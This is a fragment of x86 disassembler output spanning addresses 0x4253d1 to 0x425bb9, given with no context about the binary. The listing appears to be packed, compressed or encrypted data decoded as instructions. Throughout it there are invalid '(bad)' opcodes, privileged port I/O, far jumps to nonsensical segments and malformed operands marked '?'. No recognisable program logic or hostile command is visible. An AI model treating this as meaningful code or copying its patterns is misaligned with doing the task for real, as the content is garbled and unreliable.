  4253d1:	cmp    al,bl
  4253d3:	ret    
  4253d4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4253d5:	arpl   WORD PTR [ebp+0x33],si
  4253d8:	enter  0x575c,0x55
  4253dc:	jns    0x425371
  4253de:	and    eax,0x3d96ce4e
  4253e3:	(bad)  
  4253e4:	fnsave [ecx-0x71dfc002]
  4253ea:	xor    DWORD PTR [eax],ebp
  4253ec:	cmp    cl,BYTE PTR [eax]
  4253ee:	fs out 0xa3,al
  4253f1:	mov    ecx,0x62203246
  4253f6:	adc    ecx,ebp
  4253f8:	repnz test al,0x4d
  4253fb:	xchg   edi,eax
  4253fc:	mov    ecx,0x1f68a4a9
  425401:	addr16 popa 
  425403:	fwait
  425404:	mov    es,eax
  425406:	or     eax,0x9fcec19f
  42540b:	out    dx,eax
  42540c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42540d:	mov    cl,0xb0
  42540f:	mov    eax,0x551d5c83
  425414:	loopne 0x42540b
  425416:	loop   0x4253a7
  425418:	into   
  425419:	in     al,0xff
  42541b:	and    BYTE PTR [edx],bh
  42541d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42541e:	pop    esi
  42541f:	inc    ecx
  425420:	adc    edx,esp
  425422:	dec    edi
  425423:	scas   eax,DWORD PTR es:[edi]
  425424:	in     al,dx
  425425:	jae    0x425435
  425427:	xchg   esp,eax
  425428:	scas   eax,DWORD PTR es:[edi]
  425429:	outs   dx,BYTE PTR ds:[esi]
  42542a:	sar    dh,0x37
  42542d:	dec    ebx
  42542e:	mov    al,ds:0x24df8777
  425433:	adc    al,0xda
  425435:	mov    cl,0xad
  425437:	(bad)  [eax]
  425439:	aas    
  42543a:	data16 mov cl,0xfb
  42543d:	push   ecx
  42543e:	sbb    al,0x38
  425440:	enter  0x5fb7,0xd4
  425444:	sahf   
  425445:	xor    BYTE PTR [esi+0x7ac7de00],0x22
  42544c:	ds out 0x4f,eax
  42544f:	shl    ebx,cl
  425451:	mov    edx,0x96bd5eaf
  425456:	inc    esp
  425457:	xor    al,BYTE PTR [ebp-0x5b7418b2]
  42545d:	push   ds
  42545e:	(bad)  
  42545f:	cmp    DWORD PTR [ecx-0xb392a55],eax
  425465:	ret    
  425466:	(bad)  
  425467:	shl    DWORD PTR [ebx],1
  425469:	lods   eax,DWORD PTR ds:[esi]
  42546a:	(bad)  
  42546b:	adc    BYTE PTR [edi],al
  42546d:	push   0x44
  42546f:	jp     0x42542f
  425471:	add    esp,DWORD PTR [ecx-0x5d4af66d]
  425477:	imul   esp,DWORD PTR [esi-0x47],0xffffffd0
  42547b:	and    DWORD PTR gs:[ecx],ecx
  42547e:	inc    edi
  42547f:	cmp    esp,DWORD PTR [ebx+0x36dbaf4b]
  425485:	retf   0xfd65
  425488:	cmp    edi,ecx
  42548a:	test   DWORD PTR [ebx+0x2b],ebx
  42548d:	xchg   edi,eax
  42548e:	sahf   
  42548f:	in     eax,0xf5
  425491:	and    edi,DWORD PTR [eax+0x3ec97c17]
  425497:	mov    BYTE PTR [edi],bl
  425499:	js     0x4254a6
  42549b:	pop    ebp
  42549c:	stos   DWORD PTR es:[edi],eax
  42549d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42549e:	aaa    
  42549f:	adc    BYTE PTR [ebx-0x4e],bh
  4254a2:	or     ebx,esi
  4254a4:	mov    bh,0xdf
  4254a6:	fimul  DWORD PTR [eax+edi*8-0x44]
  4254aa:	mov    eax,ds:0x171c2d13
  4254af:	mov    ah,0xf0
  4254b1:	lahf   
  4254b2:	dec    esp
  4254b3:	jns    0x425522
  4254b5:	stc    
  4254b6:	adc    BYTE PTR [ebx],ah
  4254b8:	inc    edi
  4254b9:	mov    cl,0xe1
  4254bb:	dec    esp
  4254bc:	add    bl,ch
  4254be:	dec    ebp
  4254bf:	sbb    al,0xcd
  4254c1:	(bad)  
  4254c2:	adc    BYTE PTR [ebx],ch
  4254c4:	aad    0x56
  4254c6:	inc    ebp
  4254c7:	cmp    eax,0x4296030f
  4254cc:	les    eax,FWORD PTR [esp+ecx*8+0x78]
  4254d0:	loopne 0x425503
  4254d2:	cmp    eax,0xc139b16a
  4254d7:	in     al,0x78
  4254d9:	out    dx,eax
  4254da:	cmp    edi,DWORD PTR [edi-0x1d]
  4254dd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4254de:	or     eax,0xa98138b0
  4254e3:	sub    DWORD PTR [edx+0x2],ebp
  4254e6:	repz xor al,cl
  4254e9:	leave  
  4254ea:	jne    0x425563
  4254ec:	out    dx,eax
  4254ed:	or     ebx,ebp
  4254ef:	stos   BYTE PTR es:[edi],al
  4254f0:	retf   
  4254f1:	sbb    al,BYTE PTR [ebx+0x0]
  4254f4:	fnsave [esi]
  4254f6:	xchg   ebx,eax
  4254f7:	out    dx,al
  4254f8:	mov    ah,0x6a
  4254fa:	sub    bl,al
  4254fc:	xlat   BYTE PTR ds:[ebx]
  4254fd:	pop    ss
  4254fe:	add    DWORD PTR [ecx-0x2f],esp
  425501:	jns    0x4254ba
  425503:	xchg   ebp,eax
  425504:	rol    BYTE PTR [edx+ecx*4+0x14],0xf0
  425509:	ret    0x6343
  42550c:	(bad)  
  42550d:	pushf  
  42550e:	inc    edi
  42550f:	cli    
  425510:	icebp  
  425511:	aaa    
  425512:	xor    dh,BYTE PTR [edi-0x52bee26f]
  425518:	mov    esi,0x3d23eb1e
  42551d:	pusha  
  42551e:	ret    0xddac
  425521:	ror    bl,cl
  425523:	fst    DWORD PTR ds:0xec4da6a4
  425529:	(bad)  
  42552a:	call   0x84eb:0x35e4cb2c
  425531:	inc    eax
  425532:	add    eax,0x674aea85
  425537:	adc    edx,ebp
  425539:	fdiv   DWORD PTR [eax+0x7e]
  42553c:	in     eax,dx
  42553d:	(bad)  
  42553e:	dec    edx
  42553f:	inc    esp
  425540:	cmp    BYTE PTR [edx-0x94b2c73],bh
  425546:	jge    0x4255b3
  425548:	add    al,0xe
  42554a:	ds xchg esp,eax
  42554c:	jmp    DWORD PTR [esi+0x5b0e1a7b]
  425552:	cmp    DWORD PTR [eax-0x4a553115],eax
  425558:	xchg   edi,eax
  425559:	jne    0x425515
  42555b:	mov    al,ds:0x6f2837e8
  425560:	mov    WORD PTR [ecx-0x5a909a05],ds
  425566:	imul   ebp,ebp,0xdaced9eb
  42556c:	add    eax,0xbadd79f2
  425571:	xchg   ebx,eax
  425572:	ret    
  425573:	inc    eax
  425574:	pop    esp
  425575:	add    DWORD PTR [ebx+0x6e],0xffffffc1
  425579:	jbe    0x425507
  42557b:	ins    DWORD PTR es:[edi],dx
  42557c:	ds in  eax,dx
  42557e:	(bad)  
  42557f:	(bad)  
  425580:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  425581:	xor    eax,esp
  425583:	jbe    0x425589
  425585:	(bad)  
  425586:	sti    
  425587:	xor    esp,DWORD PTR [eax-0x55]
  42558a:	lods   al,BYTE PTR ds:[esi]
  42558b:	in     al,0xb7
  42558d:	jo     0x425560
  42558f:	jmp    0xe47b6183
  425594:	push   ss
  425595:	jg     0x425613
  425597:	jbe    0x425562
  425599:	xchg   esi,eax
  42559a:	xchg   BYTE PTR [edx-0x4e26fbdd],bh
  4255a0:	aam    0x2e
  4255a2:	pop    ds
  4255a3:	push   edx
  4255a4:	call   0x87e:0xe068cf4a
  4255ab:	mov    ecx,0xb6c6f215
  4255b0:	dec    ecx
  4255b1:	loope  0x4255a9
  4255b3:	shl    BYTE PTR [ebx-0x4023cc9b],1
  4255b9:	xchg   ebx,eax
  4255ba:	push   ebp
  4255bb:	mov    bh,0x61
  4255bd:	sub    al,0xc1
  4255bf:	xor    bl,BYTE PTR [esp+ebx*1+0x51]
  4255c3:	lahf   
  4255c4:	loope  0x425604
  4255c6:	mov    ecx,0xcb6302a2
  4255cb:	mov    dl,0xa1
  4255cd:	gs (bad) 
  4255cf:	and    edx,DWORD PTR [edi-0x33847d28]
  4255d5:	xor    edx,DWORD PTR [ebp+edx*1+0x6b]
  4255d9:	ins    DWORD PTR es:[edi],dx
  4255da:	xchg   al,ch
  4255dc:	test   DWORD PTR [eax+0x2ab1ddee],ebp
  4255e2:	ret    0x8d6e
  4255e5:	mov    dh,0xe9
  4255e7:	loope  0x4255cd
  4255e9:	jo     0x42564d
  4255eb:	push   0x7f
  4255ed:	jle    0x425609
  4255ef:	aad    0x21
  4255f1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4255f2:	or     eax,0x4cc95b4
  4255f7:	dec    ebx
  4255f8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4255f9:	(bad)  
  4255fa:	fimul  DWORD PTR [ebp+0x1159a08b]
  425600:	dec    ebx
  425601:	ret    
  425602:	mov    bl,BYTE PTR [eax-0x38040e1c]
  425608:	push   es
  425609:	adc    DWORD PTR [ebx-0x1b0cf70a],esp
  42560f:	sub    BYTE PTR [esp+ecx*4+0x2],dh
  425613:	scas   eax,DWORD PTR es:[edi]
  425614:	dec    esp
  425615:	mov    edi,0xfca39935
  42561a:	mov    bh,0x8a
  42561c:	mov    ebx,0x1502f247
  425621:	inc    ebp
  425622:	jecxz  0x4255fe
  425624:	sti    
  425625:	rcl    DWORD PTR [ecx-0x5fd43f],cl
  42562b:	xor    ah,BYTE PTR [ecx-0x10dc5526]
  425631:	pop    edx
  425632:	adc    DWORD PTR ds:0x9c4f9d66,ecx
  425638:	xlat   BYTE PTR ds:[ebx]
  425639:	fwait
  42563a:	jne    0x4255c0
  42563c:	cs cmp ebx,ebp
  42563f:	add    bh,dl
  425641:	into   
  425642:	dec    edx
  425643:	sti    
  425644:	std    
  425645:	jae    0x425626
  425647:	ret    0x886f
  42564a:	into   
  42564b:	mov    eax,ds:0xa771b223
  425650:	xchg   esp,eax
  425651:	mov    al,0x31
  425653:	imul   edx,edi,0x5e
  425656:	in     eax,dx
  425657:	mov    ebx,DWORD PTR [edi]
  425659:	jmp    0xe361d520
  42565e:	pop    eax
  42565f:	inc    ebx
  425660:	pop    es
  425661:	inc    ecx
  425662:	xor    al,dh
  425664:	dec    esi
  425665:	test   eax,0xc6faa2a5
  42566a:	imul   ebx,eax,0x46
  42566d:	(bad)  
  42566e:	out    dx,eax
  42566f:	inc    edx
  425670:	imul   edx,DWORD PTR [ebx+ebx*8-0x52],0x75
  425675:	hlt    
  425676:	mov    dh,0x9e
  425678:	xlat   BYTE PTR ds:[ebx]
  425679:	mov    al,0xb4
  42567b:	test   al,0x91
  42567d:	jmp    0x425687
  42567f:	cmp    bh,bh
  425681:	aam    0x49
  425683:	lods   eax,DWORD PTR ds:[esi]
  425684:	jbe    0x425705
  425686:	(bad)  
  425687:	cmp    ah,0x6c
  42568a:	jmp    FWORD PTR ds:0x1dec178a
  425690:	push   esp
  425691:	(bad)  
  425692:	or     bh,BYTE PTR [ebp+0x1d]
  425695:	sbb    al,0xab
  425697:	push   ebx
  425698:	push   ebx
  425699:	mov    WORD PTR [edx],?
  42569b:	xchg   ebx,eax
  42569c:	and    eax,0x4727d5c7
  4256a1:	cmp    BYTE PTR ds:0x24fde550,al
  4256a7:	or     bh,cl
  4256a9:	push   es
  4256aa:	fcomi  st,st(6)
  4256ac:	daa    
  4256ad:	pop    eax
  4256ae:	mov    esi,0xc522e3ee
  4256b3:	jmp    0x7a16:0xcd4b2029
  4256ba:	cmp    BYTE PTR [ecx+0x71],cl
  4256bd:	dec    edx
  4256be:	inc    esi
  4256bf:	mov    cs,ebx
  4256c1:	in     eax,dx
  4256c2:	inc    ebx
  4256c3:	adc    ah,BYTE PTR [eax]
  4256c5:	rcl    DWORD PTR [ecx+0x62],1
  4256c8:	(bad)  
  4256c9:	adc    BYTE PTR es:[ebx-0x4f],cl
  4256cd:	sub    DWORD PTR [ecx],0x97d4ee17
  4256d3:	rcl    DWORD PTR [eax-0x5d],1
  4256d6:	pop    ebx
  4256d7:	dec    eax
  4256d8:	sbb    al,0x3c
  4256da:	xor    dl,BYTE PTR [edi+0x36]
  4256dd:	pop    eax
  4256de:	xchg   DWORD PTR [ebp-0x6c888193],ebp
  4256e4:	stc    
  4256e5:	jo     0x425703
  4256e7:	test   al,0x1c
  4256e9:	cld    
  4256ea:	rcr    BYTE PTR [esi+0x3f],1
  4256ed:	cwde   
  4256ee:	and    al,0x1a
  4256f0:	and    ah,BYTE PTR [ecx*8-0x3e27ab86]
  4256f7:	popf   
  4256f8:	daa    
  4256f9:	sbb    DWORD PTR ds:0x47329e45,edx
  4256ff:	jmp    0xa8dd:0x29ffe3fc
  425706:	sub    al,0x2a
  425708:	bound  bp,DWORD PTR [edx+0x31]
  42570c:	sub    eax,0x98d097da
  425711:	add    al,0x2d
  425713:	imul   BYTE PTR [esi]
  425715:	or     al,BYTE PTR [edi]
  425717:	mov    al,ds:0xb57c2d2
  42571c:	push   ds
  42571d:	adc    al,0x8c
  42571f:	prefetch BYTE PTR [eax+0x71]
  425723:	mov    eax,ds:0x53569494
  425728:	mov    ebx,0xe2699612
  42572d:	mov    bl,0x8c
  42572f:	pop    esi
  425730:	inc    ecx
  425731:	popa   
  425732:	mov    edi,0xeced8f3c
  425737:	(bad)  
  425738:	xchg   edx,eax
  425739:	jb     0x425736
  42573b:	and    edi,ebp
  42573d:	(bad)  
  42573e:	addr16 mov ds:0xaedc,eax
  425742:	sub    al,0x42
  425744:	xchg   ebx,eax
  425745:	idiv   BYTE PTR [edi]
  425747:	cmp    DWORD PTR [ebp+0x68],eax
  42574a:	push   eax
  42574b:	jecxz  0x425776
  42574d:	xchg   edx,eax
  42574e:	push   ebx
  42574f:	cmp    al,0x5a
  425751:	jecxz  0x425731
  425753:	es fwait
  425755:	cs hlt 
  425757:	ds std 
  425759:	dec    esi
  42575a:	loope  0x42575a
  42575c:	xor    DWORD PTR [eax+0x632c9e20],esi
  425762:	mov    eax,ds:0x3d5300aa
  425767:	and    al,0x2b
  425769:	xchg   ebp,eax
  42576a:	sbb    DWORD PTR [ebp+0x3043d3f1],ebx
  425770:	test   BYTE PTR [ebp-0x7f714b86],ch
  425776:	cwde   
  425777:	lods   al,BYTE PTR fs:[esi]
  425779:	and    esi,DWORD PTR [ebx-0x70d7632c]
  42577f:	mov    bl,0x33
  425781:	sub    edx,DWORD PTR [edi]
  425783:	or     al,0xdd
  425785:	mov    bh,0x14
  425787:	scas   al,BYTE PTR es:[edi]
  425788:	sub    BYTE PTR [edi],bh
  42578a:	mov    ebp,0x520245b8
  42578f:	stc    
  425790:	mov    ah,0xd7
  425792:	adc    eax,0x65a3b886
  425797:	mov    ebp,0xcba0b100
  42579c:	jmp    0xaece426f
  4257a1:	push   0xc36458
  4257a6:	add    BYTE PTR [eax],al
  4257a8:	add    BYTE PTR [eax],al
  4257aa:	dec    edx
  4257ab:	inc    ebx
  4257ac:	push   ebp
  4257ad:	push   esi
  4257ae:	pop    ebp
  4257af:	push   esi
  4257b0:	dec    ebx
  4257b1:	pop    edi
  4257b2:	idiv   bl
  4257b4:	(bad)
  4257b8:	shr    bh,1
  4257ba:	and    ch,0x1
  4257bd:	add    BYTE PTR [ebx-0x1ffffffa],al
  4257c3:	mov    fs,WORD PTR [ebx+0x49431e7]
  4257c9:	sub    eax,0xeab0a77a
  4257ce:	push   ecx
  4257cf:	ret    0xb4d0
  4257d2:	add    dh,ch
  4257d4:	mov    edx,DWORD PTR [eax+0xc]
  4257d7:	sub    esp,ebx
  4257d9:	cmp    DWORD PTR [ecx+edi*1-0x7c],esp
  4257dd:	and    ecx,edi
  4257df:	(bad)  
  4257e0:	push   cs
  4257e1:	mov    fs,WORD PTR [edx-0x51767d68]
  4257e7:	add    DWORD PTR [ebx-0x640a624a],ebx
  4257ed:	sbb    edi,ebx
  4257ef:	mov    cl,0x7d
  4257f1:	ins    DWORD PTR es:[edi],dx
  4257f2:	int3   
  4257f3:	int    0x70
  4257f5:	out    dx,al
  4257f6:	call   0x94d3:0x535398b6
  4257fd:	into   
  4257fe:	into   
  4257ff:	inc    edx
  425800:	repz (bad) 
  425803:	rcr    DWORD PTR [esi-0x7d3711fc],1
  425809:	add    bl,BYTE PTR ds:0xf6e268ab
  42580f:	pushf  
  425810:	xor    DWORD PTR [ebp+0xf],ebp
  425813:	pop    ss
  425814:	loope  0x425851
  425816:	mov    ecx,0x2c16f1c9
  42581b:	aaa    
  42581c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42581d:	mov    al,0x5c
  42581f:	ds xor al,0x49
  425822:	mov    bl,0x83
  425824:	cmp    eax,0x2c543f86
  425829:	aas    
  42582a:	lods   al,BYTE PTR fs:[esi]
  42582c:	mov    esp,DWORD PTR [ebx+0x6e6cf05]
  425832:	jo     0x425859
  425834:	mov    dh,0x3f
  425836:	adc    ax,0x7222
  42583a:	int    0x1e
  42583c:	clc    
  42583d:	xchg   ebp,eax
  42583e:	(bad)  
  42583f:	sbb    BYTE PTR es:[ebx],cl
  425842:	push   edx
  425843:	aad    0xe
  425845:	loope  0x42588b
  425847:	ret    0x23a2
  42584a:	mov    BYTE PTR [edx+0x58],0x5
  42584e:	out    0x26,al
  425850:	pushf  
  425851:	push   edi
  425852:	sub    ecx,DWORD PTR [edx+0x47]
  425855:	jp     0x425808
  425857:	clc    
  425858:	outs   dx,BYTE PTR ds:[esi]
  425859:	mov    al,0x2b
  42585b:	or     ebp,edx
  42585d:	(bad)  
  42585e:	repnz outs dx,BYTE PTR ds:[esi]
  425860:	rcl    ch,cl
  425862:	pop    es
  425863:	fist   WORD PTR [ebx+0x794cbedf]
  425869:	jb     0x4257eb
  42586b:	lea    eax,[ebx]
  42586d:	fdiv   QWORD PTR [ecx+0xd]
  425872:	rcr    DWORD PTR [ebp+0x78d3193],cl
  425878:	dec    bp
  42587a:	cmp    edx,DWORD PTR [ebx+edx*1]
  42587d:	sahf   
  42587e:	pop    ebx
  42587f:	or     eax,0x5c6c5ecd
  425884:	in     al,dx
  425885:	inc    esi
  425886:	pop    ecx
  425887:	inc    esp
  425888:	clc    
  425889:	push   0xffffffdd
  42588b:	sub    DWORD PTR [edi+0x35],edi
  42588e:	pop    ecx
  42588f:	int3   
  425890:	inc    ebx
  425891:	in     al,0x9c
  425893:	push   es
  425894:	push   0xffffffd8
  425896:	repnz cmp al,BYTE PTR [edi+0x21]
  42589a:	ret    0x7a8
  42589d:	pop    ds
  42589e:	cmc    
  42589f:	jmp    0x23d5:0xfad4ee7a
  4258a6:	xor    al,0xde
  4258a8:	fwait
  4258a9:	or     al,0xd4
  4258ab:	push   edi
  4258ac:	adc    esi,DWORD PTR [ebx-0x33302209]
  4258b2:	lea    esi,[eax+0x3b]
  4258b5:	sbb    bh,BYTE PTR [edi-0x421e64ff]
  4258bb:	call   0x7de6:0x8651d139
  4258c2:	aam    0xee
  4258c4:	cmp    cl,0x75
  4258c7:	add    BYTE PTR [ecx+0x76],dl
  4258ca:	mov    edi,0xd0daeb70
  4258cf:	mov    esi,ebx
  4258d1:	xor    al,0x4c
  4258d3:	idiv   BYTE PTR [esi-0xc]
  4258d6:	jp     0x425933
  4258d8:	mov    cl,0xdb
  4258da:	and    BYTE PTR [ebp+0x47aee5f2],ah
  4258e0:	pop    ecx
  4258e1:	jle    0x4258c0
  4258e3:	iret   
  4258e4:	aad    0xe3
  4258e6:	imul   edx,DWORD PTR [edx-0x44afdc3a],0x227dfa73
  4258f0:	mov    cl,BYTE PTR [ebx-0x6d91f957]
  4258f6:	cmp    eax,DWORD PTR [edx-0x2c]
  4258f9:	clc    
  4258fa:	std    
  4258fb:	xchg   DWORD PTR [eax-0x4b],edx
  4258fe:	mov    edx,0xa217d145
  425903:	add    DWORD PTR [edi-0x4b51a388],edi
  425909:	add    edi,DWORD PTR [ebp-0x550e8af6]
  42590f:	nop
  425910:	and    bh,bh
  425912:	enter  0x3cb3,0x82
  425916:	sub    eax,0x8f9f5d66
  42591b:	xor    ah,BYTE PTR [ebx-0xf]
  42591e:	fst    st(3)
  425920:	fwait
  425921:	sub    cl,ch
  425923:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  425924:	jno    0x4258e8
  425926:	ds mov ebx,0xd11c586c
  42592c:	jmp    0xf0fb:0x41695e9e
  425933:	test   DWORD PTR [edi-0x6416ab8c],0xc88290f2
  42593d:	mov    ebp,0x750ee963
  425942:	sbb    al,0xe
  425944:	icebp  
  425945:	mov    cs,WORD PTR [ebx]
  425947:	adc    dl,0x35
  42594a:	mov    ecx,DWORD PTR [esi-0x39]
  42594d:	rcr    BYTE PTR [edi+0x72a59fc8],cl
  425953:	mov    dl,0xa8
  425955:	arpl   cx,di
  425957:	push   0xd
  425959:	add    BYTE PTR [ebp+edi*4+0x74],bl
  42595d:	and    eax,0xf01d9f2a
  425962:	idiv   BYTE PTR [eax-0x5f8a96b7]
  425968:	ds ret 
  42596a:	jmp    0x425918
  42596c:	xor    DWORD PTR [eax+edi*2],edx
  42596f:	mov    eax,0x6dd89619
  425974:	mov    ds:0xae471576,al
  425979:	or     DWORD PTR [esi-0x4c],edi
  42597c:	inc    esi
  42597d:	int3   
  42597e:	and    al,0xc1
  425980:	aaa    
  425981:	dec    ecx
  425982:	test   al,0x2a
  425984:	jno    0x425914
  425986:	adc    BYTE PTR [ebx],0x68
  425989:	bound  ebp,QWORD PTR [edi-0x34090204]
  42598f:	nop
  425990:	dec    edx
  425991:	cli    
  425992:	adc    BYTE PTR [ebx],dh
  425994:	mov    ebp,0xdda42f73
  425999:	inc    edx
  42599a:	jno    0xca70da32
  4259a0:	out    0x7,al
  4259a2:	iret   
  4259a3:	xchg   edx,eax
  4259a4:	lea    ebx,[ecx+eiz*8-0x146f3c63]
  4259ab:	or     edi,edi
  4259ad:	call   0xeffe27c6
  4259b2:	and    ebp,DWORD PTR [edi-0x52d81349]
  4259b8:	mov    cl,BYTE PTR [eax-0x54]
  4259bb:	dec    eax
  4259bc:	and    al,0x16
  4259be:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4259bf:	in     al,dx
  4259c0:	jp     0x42599f
  4259c2:	mov    eax,0x660efffc
  4259c7:	shr    dl,0x6d
  4259ca:	add    cl,BYTE PTR [ebx-0x25]
  4259cd:	pop    ebp
  4259ce:	frstor ds:0xa373e11b
  4259d4:	bound  ecx,QWORD PTR [edx-0x50]
  4259d7:	aaa    
  4259d8:	fcmovbe st,st(6)
  4259da:	mov    ds:0xd16dcdad,eax
  4259df:	jge    0x425a36
  4259e1:	xchg   ebp,eax
  4259e2:	scas   al,BYTE PTR es:[edi]
  4259e3:	mov    ?,WORD PTR [ebx+0x32]
  4259e6:	dec    esp
  4259e7:	jl     0x425a17
  4259e9:	int3   
  4259ea:	push   esp
  4259eb:	mov    WORD PTR [ebx+0x534dc6a7],?
  4259f1:	lods   al,BYTE PTR ds:[esi]
  4259f2:	pop    ds
  4259f3:	mov    ch,0x5
  4259f5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4259f6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4259f7:	addr16 push ecx
  4259f9:	mov    edx,0x87c0bd00
  4259fe:	mov    ebp,0xbd6abb3c
  425a03:	inc    ecx
  425a04:	stc    
  425a05:	mov    eax,ds:0xef583aa0
  425a0a:	fisubr DWORD PTR [ebx]
  425a0c:	mov    edx,0x33b3f889
  425a11:	jle    0x425a25
  425a13:	dec    esi
  425a14:	out    0xf5,al
  425a16:	iret   
  425a17:	xor    DWORD PTR [ebx],esi
  425a19:	sbb    esi,DWORD PTR [ecx]
  425a1b:	in     al,dx
  425a1c:	or     eax,0xddb9277b
  425a21:	sbb    al,BYTE PTR ss:[eax]
  425a24:	jg     0x425a56
  425a26:	icebp  
  425a27:	and    eax,DWORD PTR [ecx+0xe]
  425a2a:	jae    0x4259be
  425a2c:	xchg   ebx,eax
  425a2d:	jl     0x425a31
  425a2f:	jl     0x4259fc
  425a31:	aad    0x30
  425a33:	sbb    BYTE PTR [ebx],dh
  425a35:	mov    al,ds:0x849acae4
  425a3a:	jecxz  0x425aa7
  425a3c:	in     eax,dx
  425a3d:	push   ecx
  425a3e:	add    DWORD PTR [edi-0xe],edi
  425a41:	adc    bh,BYTE PTR [ecx+0x50942b79]
  425a47:	(bad)  
  425a48:	out    0xeb,eax
  425a4a:	dec    ecx
  425a4b:	mov    bh,0x8a
  425a4d:	mov    ebx,0x86ffb7ef
  425a52:	in     eax,dx
  425a53:	jmp    0xf106915d
  425a58:	jecxz  0x425a02
  425a5a:	aaa    
  425a5b:	into   
  425a5c:	xchg   esp,eax
  425a5d:	pop    esp
  425a5e:	jmp    0x425a0e
  425a60:	mov    ecx,0xb0c87423
  425a65:	test   DWORD PTR [ebx-0x3bb89a08],0x55d5b3fc
  425a6f:	fsub   DWORD PTR [ebp-0x6e]
  425a72:	jnp    0x425a27
  425a74:	pushf  
  425a75:	jmp    0x44a2:0xa2e40e5f
  425a7c:	push   ebp
  425a7d:	xor    eax,DWORD PTR [esi]
  425a7f:	mov    dl,0x42
  425a81:	mov    esi,edx
  425a83:	dec    ecx
  425a84:	dec    ecx
  425a85:	dec    esp
  425a86:	fild   WORD PTR [ecx]
  425a88:	les    ebp,FWORD PTR [ebp-0x1d]
  425a8b:	xchg   edx,ebp
  425a8d:	add    DWORD PTR [ebp+0x63],edx
  425a90:	psrad  mm4,QWORD PTR [ecx-0x7]
  425a94:	xchg   esp,eax
  425a95:	popa   
  425a96:	pop    ebx
  425a97:	rcl    BYTE PTR [esi-0x4a42767d],1
  425a9d:	fsubp  st(4),st
  425a9f:	mov    ch,0xd7
  425aa1:	sti    
  425aa2:	sbb    DWORD PTR [eax+0x3e],esi
  425aa5:	or     ebp,DWORD PTR [ebp-0x115a6699]
  425aab:	fwait
  425aac:	into   
  425aad:	xchg   esi,eax
  425aae:	fs test eax,0x4b7e300d
  425ab4:	dec    ebp
  425ab5:	and    al,0x32
  425ab7:	neg    DWORD PTR [ebx+ecx*1]
  425aba:	enter  0x64c1,0x3d
  425abe:	lods   eax,DWORD PTR ds:[esi]
  425abf:	xchg   esp,ebp
  425ac1:	scas   al,BYTE PTR es:[edi]
  425ac2:	lds    esi,FWORD PTR ds:0x5ffb4e12
  425ac8:	test   eax,0x22ea3931
  425acd:	mov    al,0xd3
  425acf:	das    
  425ad0:	arpl   di,bp
  425ad2:	out    0x96,al
  425ad4:	add    al,0x57
  425ad6:	jl     0x425b26
  425ad8:	jb     0x425b03
  425ada:	fisub  DWORD PTR [eax+0x1d]
  425add:	popf   
  425ade:	cmp    eax,0x5594adb9
  425ae3:	sbb    ch,BYTE PTR [edi-0x2ca80f2a]
  425ae9:	mov    ah,0x4d
  425aeb:	enter  0xcd1c,0xe9
  425aef:	in     al,dx
  425af0:	mov    bl,0x7e
  425af2:	movups XMMWORD PTR [ecx-0x4b],xmm4
  425af6:	icebp  
  425af7:	arpl   sp,sp
  425af9:	xchg   edx,eax
  425afa:	nop
  425afb:	xchg   edi,eax
  425afc:	loop   0x425b32
  425afe:	iret   
  425aff:	std    
  425b00:	arpl   cx,di
  425b02:	pop    ebx
  425b03:	aaa    
  425b04:	inc    cx
  425b06:	or     DWORD PTR [ebp+0x5c99097e],edx
  425b0c:	stc    
  425b0d:	call   FWORD PTR [edx+0x4a]
  425b10:	sub    al,0x11
  425b12:	cs xor eax,0xaf29c8bc
  425b18:	push   es
  425b19:	lds    eax,FWORD PTR [edx]
  425b1b:	sub    BYTE PTR [edx+0x6a],al
  425b1e:	ror    DWORD PTR [ecx+0x63],0xa3
  425b22:	sbb    DWORD PTR [ebx-0x4b6149a1],edi
  425b28:	jo     0x425ba3
  425b2a:	stc    
  425b2b:	lock jmp 0x425b4d
  425b2e:	pop    ebp
  425b2f:	xor    DWORD PTR [edx],esp
  425b31:	or     BYTE PTR [ecx],ch
  425b33:	push   eax
  425b34:	out    dx,eax
  425b35:	ror    BYTE PTR [ecx+0x37],1
  425b38:	mov    dl,0x15
  425b3a:	jp     0x425b87
  425b3c:	push   0x0
  425b3e:	push   0xa73196d7
  425b43:	imul   ebx,DWORD PTR [eax],0xffffffa4
  425b46:	cmp    eax,0x400dcb2a
  425b4b:	mov    esi,0x2d51f13f
  425b50:	push   esp
  425b51:	mov    es,WORD PTR [esi-0x353b5fc7]
  425b57:	jno    0x425bc0
  425b59:	sbb    BYTE PTR [ebx+0x498603f3],al
  425b5f:	dec    eax
  425b60:	or     DWORD PTR [edi+0x27],ebp
  425b63:	lods   eax,DWORD PTR ds:[esi]
  425b64:	popf   
  425b65:	popa   
  425b66:	cmc    
  425b67:	cmp    eax,0x5d6adf9c
  425b6c:	cld    
  425b6d:	scas   eax,DWORD PTR es:[edi]
  425b6e:	mov    DWORD PTR [edi-0x3f],ebx
  425b71:	mov    al,ds:0xfd3e22f8
  425b76:	lahf   
  425b77:	xchg   edi,eax
  425b78:	sub    al,0x92
  425b7a:	mov    bl,0xd5
  425b7c:	jno    0x425b10
  425b7e:	add    DWORD PTR [esi+0x7186be4a],0x8add32d8
  425b88:	ds loop 0x425ba9
  425b8b:	inc    eax
  425b8c:	cvtps2pd xmm4,QWORD PTR [ebx+0x6becdb4e]
  425b93:	call   0x4416:0xae9ab80f
  425b9a:	mov    ds:0x7c83c2f,eax
  425b9f:	push   esi
  425ba0:	nop
  425ba1:	mov    ebp,0x33d8e211
  425ba6:	push   edi
  425ba7:	je     0x425bf5
  425ba9:	cmp    edx,DWORD PTR [eax+0x4ced24a9]
  425baf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  425bb0:	sbb    ebp,esp
  425bb2:	sbb    ebp,DWORD PTR [esi]
  425bb4:	test   eax,0x21fd5cab
  425bb9:	popf   
